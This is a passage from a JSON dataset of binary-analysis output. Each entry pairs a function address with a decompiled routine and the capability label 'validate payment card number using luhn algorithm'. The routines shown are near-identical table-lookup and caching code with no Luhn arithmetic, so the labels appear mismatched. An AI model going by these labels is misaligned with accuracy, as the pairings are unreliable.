        "decompiled_code": "\nint64_t fcn.180076930(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289c8;\n    iStackX24 = *0x1801289c8;\n    if (*0x1801286e0 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x1801286e0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801286e0 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x1801286e0;\n    iVar3 = *(arg1 + 8);\n    if (*0x1801286e0 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x1801286e0 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.1800794b4(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289c8 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 623
    },
    "180076a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180076a64(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289f0;\n    iStackX24 = *0x1801289f0;\n    if (*0x180128940 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128940 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128940 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128940;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128940 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128940 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.1800795c4(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289f0 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 612
    },
    "180076b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180076b98(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128990;\n    iStackX24 = *0x180128990;\n    if (*0x1801288f0 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x1801288f0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801288f0 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x1801288f0;\n    iVar3 = *(arg1 + 8);\n    if (*0x1801288f0 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x1801288f0 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079688(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128990 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 616
    },
    "180076cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180076ccc(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289f8;\n    iStackX24 = *0x1801289f8;\n    if (*0x180128948 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128948 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128948 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128948;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128948 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128948 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18007974c(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289f8 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 610
    },
    "180076e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180076e00(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128998;\n    iStackX24 = *0x180128998;\n    if (*0x1801288f8 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x1801288f8 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801288f8 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x1801288f8;\n    iVar3 = *(arg1 + 8);\n    if (*0x1801288f8 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x1801288f8 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079810(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128998 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 616
    },
    "180076f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180076f34(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a00;\n    iStackX24 = *0x180128a00;\n    if (*0x180128950 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128950 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128950 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128950;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128950 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128950 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.1800798d4(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a00 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 609
    },
    "18007706": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180077068(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289a0;\n    iStackX24 = *0x1801289a0;\n    if (*0x180128900 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128900 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128900 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128900;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128900 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128900 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079998(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289a0 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 609
    },
    "18007719": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18007719c(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a10;\n    iStackX24 = *0x180128a10;\n    if (*0x180128960 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128960 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128960 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128960;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128960 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128960 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079a5c(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a10 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 609
    },
    "1800772d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800772d0(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a08;\n    iStackX24 = *0x180128a08;\n    if (*0x180128958 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128958 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128958 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128958;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128958 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128958 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079b3c(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a08 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 610
    },
    "18007740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180077404(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289b0;\n    iStackX24 = *0x1801289b0;\n    if (*0x180128910 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128910 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128910 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128910;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128910 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128910 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079c1c(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289b0 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 611
    },
    "18007753": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180077538(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289a8;\n    iStackX24 = *0x1801289a8;\n    if (*0x180128908 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128908 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128908 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128908;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128908 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128908 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079cfc(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289a8 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 610
    },
    "18007766": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18007766c(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289d0;\n    iStackX24 = *0x1801289d0;\n    if (*0x180128920 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128920 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128920 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128920;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128920 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128920 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079ddc(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289d0 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 611
    },
    "1800777a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800777a0(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128978;\n    iStackX24 = *0x180128978;\n    if (*0x1801288d8 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x1801288d8 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801288d8 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x1801288d8;\n    iVar3 = *(arg1 + 8);\n    if (*0x1801288d8 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x1801288d8 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079ea0(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128978 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 618
    },
    "1800778d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800778d4(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289d8;\n    iStackX24 = *0x1801289d8;\n    if (*0x180128928 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128928 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128928 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128928;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128928 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128928 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.180079f64(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289d8 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 612
    },
    "180077a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180077a08(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128980;\n    iStackX24 = *0x180128980;\n    if (*0x1801288e0 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x1801288e0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801288e0 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x1801288e0;\n    iVar3 = *(arg1 + 8);\n    if (*0x1801288e0 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x1801288e0 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18007a028(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128980 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 617
    },
    "180077b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
